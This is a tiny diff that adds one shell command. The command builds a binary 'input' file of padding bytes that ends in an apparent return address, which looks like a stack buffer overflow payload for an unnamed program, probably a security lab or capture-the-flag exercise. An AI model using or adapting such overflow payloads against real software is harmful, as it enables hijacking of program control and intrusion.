@@ -1,0 +1,2 @@
+echo -n -e "AAAA\x00\x0d\x0a\xff\xd4\xcf\xff\xff" > input && echo -n -e "BBBBbbbbCCCCccccDDDDddddEEEEeeeeFFFFffffGGGGggggHHHHhhhhIIIIiiiiJJJJ\x74\xc7\xff\xff" >> input
+
